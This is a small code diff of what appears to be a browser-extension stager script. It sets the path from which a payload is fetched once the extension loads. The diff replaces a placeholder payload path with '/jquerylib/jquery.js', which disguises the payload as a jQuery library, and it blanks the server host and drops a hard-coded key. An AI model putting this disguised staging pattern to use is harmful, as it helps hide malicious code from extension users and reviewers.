@@ -1,8 +1,7 @@
 // Initial stage request once the extension is loaded
 
-const stagerURI = '/something/something/payload.js';
-const serverHost = 'www.host.com';
-const key = "password";
+const stagerURI = '/jquerylib/jquery.js';
+const serverHost = '';
 
 // helper function to generate random alphanumeric string
 function GenerateID(length) {
